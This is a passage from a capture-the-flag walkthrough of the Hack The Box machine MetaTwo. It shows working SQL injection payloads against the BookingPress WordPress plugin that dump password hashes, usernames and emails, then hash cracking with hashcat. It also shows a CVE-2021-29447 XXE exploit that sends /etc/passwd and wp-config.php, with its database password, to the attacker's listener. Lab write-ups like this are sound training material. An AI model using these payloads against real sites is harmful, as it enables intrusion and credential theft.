+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>ALL_PLUGINS</span><span class=p>,</span><span class=n>APPLICABLE_ROLES</span><span class=p>,</span><span class=n>CHARACTER_SETS</span><span class=p>,</span><span class=n>CHECK_CONSTRAINTS</span><span class=p>,</span><span class=n>COLLATIONS</span><span class=p>,</span><span class=n>COLLATION_CHARACTER_SET_APPLICABILITY</span><span class=p>,</span><span class=n>COLUMNS</span><span class=p>,</span><span class=n>COLUMN_PRIVILEGES</span><span class=p>,</span><span class=n>ENABLED_ROLES</span><span class=p>,</span><span class=n>ENGINES</span><span class=p>,</span><span class=n>EVENTS</span><span class=p>,</span><span class=n>FILES</span><span class=p>,</span><span class=n>GLOBAL_STATUS</span><span class=p>,</span><span class=n>GLOBAL_VARIABLES</span><span class=p>,</span><span class=n>KEYWORDS</span><span class=p>,</span><span class=n>KEY_CACHES</span><span class=p>,</span><span class=n>KEY_COLUMN_USAGE</span><span class=p>,</span><span class=n>OPTIMIZER_TRACE</span><span class=p>,</span><span class=n>PARAMETERS</span><span class=p>,</span><span class=n>PARTITIONS</span><span class=p>,</span><span class=n>PLUGINS</span><span class=p>,</span><span class=n>PROCESSLIST</span><span class=p>,</span><span class=n>PROFILING</span><span class=p>,</span><span class=n>REFERENTIAL_CONSTRAINTS</span><span class=p>,</span><span class=n>ROUTINES</span><span class=p>,</span><span class=n>SCHEMATA</span><span class=p>,</span><span class=n>SCHEMA_PRIVILEGES</span><span class=p>,</span><span class=n>SESSION_STATUS</span><span class=p>,</span><span class=n>SESSION_VARIABLES</span><span class=p>,</span><span class=n>STATISTICS</span><span class=p>,</span><span class=n>SQL_FUNCTIONS</span><span class=p>,</span><span class=n>SYSTEM_VARIABLES</span><span class=p>,</span><span class=n>TABLES</span><span class=p>,</span><span class=n>TABLESPACES</span><span class=p>,</span><span class=n>TABLE_CONSTRAINTS</span><span class=p>,</span><span class=n>TABLE_PRIVILEGES</span><span class=p>,</span><span class=n>TRIGGERS</span><span class=p>,</span><span class=n>USER_PRIVILEGES</span><span class=p>,</span><span class=n>VIEWS</span><span class=p>,</span><span class=n>CLIENT_STATISTICS</span><span class=p>,</span><span class=n>INDEX_STATISTICS</span><span class=p>,</span><span class=n>INNODB_SYS_DATAFILES</span><span class=p>,</span><span class=n>GEOMETRY_COLUMNS</span><span class=p>,</span><span class=n>INNODB_SYS_TABLESTATS</span><span class=p>,</span><span class=n>SPATIAL_REF_SYS</span><span class=p>,</span><span class=n>INNODB_BUFFER_PAGE</span><span class=p>,</span><span class=n>INNODB_TRX</span><span class=p>,</span><span class=n>INNODB_CMP_PER_INDEX</span><span class=p>,</span><span class=n>INNODB_METRICS</span><span class=p>,</span><span class=n>INNODB_LOCK_WAITS</span><span class=p>,</span><span class=n>INNODB_CMP</span><span class=p>,</span><span class=n>THREAD_POOL_WAITS</span><span class=p>,</span><span class=n>INNODB_CMP_RESET</span><span class=p>,</span><span class=n>THREAD_POOL_QUEUES</span><span class=p>,</span><span class=n>TABLE_STATISTICS</span><span class=p>,</span><span class=n>INNODB_SYS_FIELDS</span><span class=p>,</span><span class=n>INNODB_BUFFER_PAGE_LRU</span><span class=p>,</span><span class=n>INNODB_LOCKS</span><span class=p>,</span><span class=n>INNODB_FT_INDEX_TABLE</span><span class=p>,</span><span class=n>INNODB_CMPMEM</span><span class=p>,</span><span class=n>THREAD_POOL_GROUPS</span><span class=p>,</span><span class=n>INNODB_CMP_PER_INDEX_RESET</span><span class=p>,</span><span class=n>INNODB_SYS_FOREIGN_COLS</span><span class=p>,</span><span class=n>INNODB_FT_INDEX_CACHE</span><span class=p>,</span><span class=n>INNODB_BUFFER_POOL_STATS</span><span class=p>,</span><span class=n>INNODB_FT_BEING_DELETED</span><span class=p>,</span><span class=n>INNODB_SYS_FOREIGN</span><span class=p>,</span><span class=n>INNODB_CMPMEM_RESET</span><span class=p>,</span><span class=n>INNODB_FT_DEFAULT_STOPWORD</span><span class=p>,</span><span class=n>INNODB_SYS_TABLES</span><span class=p>,</span><span class=n>INNODB_SYS_COLUMNS</span><span class=p>,</span><span class=n>INNODB_FT_CONFIG</span><span class=p>,</span><span class=n>USER_STATISTICS</span><span class=p>,</span><span class=n>INNODB_SYS_TABLESPACES</span><span class=p>,</span><span class=n>INNODB_SYS_VIRTUAL</span><span class=p>,</span><span class=n>INNODB_SYS_INDEXES</span><span class=p>,</span><span class=n>INNODB_SYS_SEMAPHORE_WAITS</span><span class=p>,</span><span class=n>INNODB_MUTEXES</span><span class=p>,</span><span class=n>user_variables</span><span class=p>,</span><span class=n>INNODB_TABLESPACES_ENCRYPTION</span><span class=p>,</span><span class=n>INNODB_FT_DELETED</span><span class=p>,</span><span class=n>THREAD_POOL_STATS</span><span class=p>,</span><span class=n>wp_options</span><span class=p>,</span><span class=n>wp_term_taxonomy</span><span class=p>,</span><span class=n>wp_bookingpress_servicesmeta</span><span class=p>,</span><span class=n>wp_commentmeta</span><span class=p>,</span><span class=n>wp_users</span><span class=p>,</span><span class=n>wp_bookingpress_customers_meta</span><span class=p>,</span><span class=n>wp_bookingpress_settings</span><span class=p>,</span><span class=n>wp_bookingpress_appointment_bookings</span><span class=p>,</span><span class=n>wp_bookingpress_customize_settings</span><span class=p>,</span><span class=n>wp_bookingpress_debug_payment_log</span><span class=p>,</span><span class=n>wp_bookingpress_services</span><span class=p>,</span><span class=n>wp_termmeta</span><span class=p>,</span><span class=n>wp_links</span><span class=p>,</span><span class=n>wp_bookingpress_entries</span><span class=p>,</span><span class=n>wp_bookingpress_categories</span><span class=p>,</span><span class=n>wp_bookingpress_customers</span><span class=p>,</span><span class=n>wp_bookingpress_notifications</span><span class=p>,</span><span class=n>wp_usermeta</span><span class=p>,</span><span class=n>wp_terms</span><span class=p>,</span><span class=n>wp_bookingpress_default_daysoff</span><span class=p>,</span><span class=n>wp_comments</span><span class=p>,</span><span class=n>wp_bookingpress_default_workhours</span><span class=p>,</span><span class=n>wp_postmeta</span><span class=p>,</span><span class=n>wp_bookingpress_form_fields</span><span class=p>,</span><span class=n>wp_bookingpress_payment_logs</span><span class=p>,</span><span class=n>wp_posts</span><span class=p>,</span><span class=n>wp_term_relationships</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>We can leak the password hashes</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>action=bookingpress_front_get_category_services&amp;_wpnonce=8a84dd7273&amp;category_id=33&amp;total_service=-7502)+UNION+ALL+SELECT+GROUP_CONCAT(user_pass),1,2,1,2,3,4,5,6+FROM+blog.wp_users--+-
+</span></span></code></pre></td></tr></table></div></div><ul><li>Refer: <a class=link href=https://codex.wordpress.org/Database_Description#Table:_wp_users target=_blank rel=noopener>https://codex.wordpress.org/Database_Description#Table:_wp_users</a>
+Output:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>To leak the email and usernames,</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>action=bookingpress_front_get_category_services&amp;_wpnonce=8a84dd7273&amp;category_id=33&amp;total_service=-7502)+UNION+ALL+SELECT+GROUP_CONCAT(user_login),GROUP_CONCAT(user_email),2,1,2,3,4,5,6+FROM+blog.wp_users--+-
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>admin,manager
+</span></span><span class=line><span class=cl>admin@metapress.htb,manager@metapress.htb
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>Let&rsquo;s try to crack the hashes</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hashcat -a 0 -m 400 hashes /usr/share/wordlists/rockyou.txt 
+</span></span></code></pre></td></tr></table></div></div><p>Very interesting fact: The reason one of the hashes didn&rsquo;t work is because it is being escaped in the JSON response!! Remove the <code>\</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70 =&gt; $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
+</span></span></code></pre></td></tr></table></div></div><ul><li>Creds did not work with SSH and FTP</li></ul><ol start=6><li>This is the current user</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>action=bookingpress_front_get_category_services&amp;_wpnonce=8a84dd7273&amp;category_id=33&amp;total_service=-7502)+UNION+ALL+SELECT+user(),1,2,1,2,3,4,5,6--+-
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>blog@localhost
+</span></span></code></pre></td></tr></table></div></div><h2 id=getting-shell>Getting Shell</h2><ol><li>We can use the creds to log into <code>wp-admin</code>. However, we do not have the option to upload a plugin.
+<img src=/p/htb-metatwo-writeup/HTB-MetaTwo-2.png width=2380 height=470 srcset="/p/htb-metatwo-writeup/HTB-MetaTwo-2_hu_9cbedfc492fb0b36.png 480w, /p/htb-metatwo-writeup/HTB-MetaTwo-2_hu_df1bc93fe52d6d1b.png 1024w" loading=lazy alt=HTB-MetaTwo-2.png class=gallery-image data-flex-grow=506 data-flex-basis=1215px></li><li>When we try to upload the a PHP Shell, we get this
+<img src=/p/htb-metatwo-writeup/HTB-MetaTwo-3.png width=1819 height=1095 srcset="/p/htb-metatwo-writeup/HTB-MetaTwo-3_hu_272db36ae400cefa.png 480w, /p/htb-metatwo-writeup/HTB-MetaTwo-3_hu_f36b957eb3023666.png 1024w" loading=lazy alt=HTB-MetaTwo-3.png class=gallery-image data-flex-grow=166 data-flex-basis=398px></li><li>This version of Wordpress is vulnerable to <a class=link href=https://github.com/0xRar/CVE-2021-29447-PoC/blob/main/PoC.py target=_blank rel=noopener>CVE-2021-29447</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 PoC.py -l 10.10.16.35 -p 9999 -f /etc/passwd
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl>    <span class=err>╔═╗╦</span>  <span class=err>╦╔═╗</span>
+</span></span><span class=line><span class=cl>    <span class=err>║</span>  <span class=err>╚╗╔╝║╣────</span><span class=mi>2021</span><span class=o>-</span><span class=mi>29447</span>
+</span></span><span class=line><span class=cl>    <span class=err>╚═╝</span> <span class=err>╚╝</span> <span class=err>╚═╝</span>
+</span></span><span class=line><span class=cl>    <span class=n>Written</span> <span class=n>By</span> <span class=p>(</span><span class=n>Isa</span> <span class=n>Ebrahim</span> <span class=o>-</span> <span class=mi>0</span><span class=n>xRar</span><span class=p>)</span> <span class=n>on</span> <span class=n>January</span><span class=p>,</span> <span class=mi>2023</span>                                                                                     
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=err>═══════════════════════════════════════════════════════════════════════════</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Title</span><span class=p>:</span> <span class=n>Wordpress</span> <span class=n>XML</span> <span class=n>parsing</span> <span class=n>issue</span> <span class=ow>in</span> <span class=n>the</span> <span class=n>Media</span> <span class=n>Library</span> <span class=n>leading</span> <span class=n>to</span> <span class=n>XXE</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Affected</span> <span class=n>versions</span><span class=p>:</span> <span class=n>Wordpress</span> <span class=mf>5.6</span> <span class=o>-</span> <span class=mf>5.7</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Patched</span> <span class=n>version</span><span class=p>:</span> <span class=n>Wordpress</span> <span class=mf>5.7</span><span class=o>.</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Installation</span> <span class=n>version</span><span class=p>:</span> <span class=n>PHP</span> <span class=mi>8</span>
+</span></span><span class=line><span class=cl>    <span class=err>═══════════════════════════════════════════════════════════════════════════</span>
+</span></span><span class=line><span class=cl>     
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>payload</span><span class=o>.</span><span class=n>wav</span> <span class=n>was</span> <span class=n>created</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>evil</span><span class=o>.</span><span class=n>dtd</span> <span class=n>was</span> <span class=n>created</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>manually</span> <span class=n>upload</span> <span class=n>the</span> <span class=n>payload</span><span class=o>.</span><span class=n>wav</span> <span class=n>file</span> <span class=n>to</span> <span class=n>the</span> <span class=n>Media</span> <span class=n>Library</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>wait</span> <span class=k>for</span> <span class=n>the</span> <span class=n>GET</span> <span class=n>request</span><span class=o>.</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>We can upload the WAV file here:
+<img src=/p/htb-metatwo-writeup/HTB-MetaTwo-4.png width=1999 height=515 srcset="/p/htb-metatwo-writeup/HTB-MetaTwo-4_hu_1e87202f8b8b02.png 480w, /p/htb-metatwo-writeup/HTB-MetaTwo-4_hu_6fb64992c116eb95.png 1024w" loading=lazy alt=HTB-MetaTwo-4.png class=gallery-image data-flex-grow=388 data-flex-basis=931px></li><li>After uploading, we get this</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[Wed Feb  4 22:05:24 2026] 10.129.228.95:58328 Closing
+</span></span><span class=line><span class=cl>[Wed Feb  4 22:05:25 2026] 10.129.228.95:58330 Accepted
+</span></span><span class=line><span class=cl>[Wed Feb  4 22:05:25 2026] 10.129.228.95:58330 [200]: GET /evil.dtd
+</span></span><span class=line><span class=cl>[Wed Feb  4 22:05:25 2026] 10.129.228.95:58330 Closing
+</span></span><span class=line><span class=cl>[Wed Feb  4 22:05:25 2026] 10.129.228.95:58334 Accepted
+</span></span><span class=line><span class=cl>[Wed Feb  4 22:05:25 2026] 10.129.228.95:58334 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
+</span></span></code></pre></td></tr></table></div></div><ol start=6><li>To decode it, we will use</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat decode.php 
+</span></span><span class=line><span class=cl>&lt;?php 
+</span></span><span class=line><span class=cl>$a=&#39;jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw==&#39;;
+</span></span><span class=line><span class=cl>echo zlib_decode(base64_decode($a)); 
+</span></span><span class=line><span class=cl>?&gt;
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php decode.php
+</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>&lt;SNIP&gt;
+</span></span><span class=line><span class=cl>systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+</span></span></code></pre></td></tr></table></div></div><ul><li>RCE confirmed!</li></ul><ol start=7><li>We can get the web root from the nginx config</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 PoC.py -l 10.10.16.35 -p 9999 -f /etc/nginx/sites-enabled/default 
+</span></span></code></pre></td></tr></table></div></div><ul><li>Wasted too much time trying to find the web root.
+Output:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-nginx data-lang=nginx><span class=line><span class=cl><span class=k>server</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kn>listen</span> <span class=mi>80</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kn>listen</span> <span class=s>[::]:80</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kn>root</span> <span class=s>/var/www/metapress.htb/blog</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kn>index</span> <span class=s>index.php</span> <span class=s>index.html</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kn>if</span> <span class=s>(</span><span class=nv>$http_host</span> <span class=s>!=</span> <span class=s>&#34;metapress.htb&#34;)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=kn>rewrite</span> <span class=s>^</span> <span class=s>http://metapress.htb/</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kn>location</span> <span class=s>/</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=kn>try_files</span> <span class=nv>$uri</span> <span class=nv>$uri/</span> <span class=s>/index.php?</span><span class=nv>$args</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>        <span class=kn>location</span> <span class=p>~</span> <span class=sr>\.php$</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=kn>include</span> <span class=s>snippets/fastcgi-php.conf</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=kn>fastcgi_pass</span> <span class=s>unix:/var/run/php/php8.0-fpm.sock</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=kn>location</span> <span class=p>~</span><span class=sr>*</span> <span class=s>\.(js|css|png|jpg|jpeg|gif|ico|svg)</span>$ <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=kn>expires</span> <span class=s>max</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>                <span class=kn>log_not_found</span> <span class=no>off</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=8><li>We can get the <code>wp-config.php</code> this way</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>python3 PoC.py -l 10.10.16.35 -p <span class=m>9999</span> -f /var/www/metapress.htb/blog/wp-config.php
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=sd>/** The name of the database for WordPress */</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_NAME&#39;</span><span class=p>,</span> <span class=s1>&#39;blog&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sd>/** MySQL database username */</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_USER&#39;</span><span class=p>,</span> <span class=s1>&#39;blog&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sd>/** MySQL database password */</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_PASSWORD&#39;</span><span class=p>,</span> <span class=s1>&#39;635Aq@TdqrCwXFUZ&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sd>/** MySQL hostname */</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_HOST&#39;</span><span class=p>,</span> <span class=s1>&#39;localhost&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sd>/** Database Charset to use in creating database tables. */</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_CHARSET&#39;</span><span class=p>,</span> <span class=s1>&#39;utf8mb4&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=sd>/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_COLLATE&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FS_METHOD&#39;</span><span class=p>,</span> <span class=s1>&#39;ftpext&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_USER&#39;</span><span class=p>,</span> <span class=s1>&#39;metapress.htb&#39;</span> <span class=p>);</span>
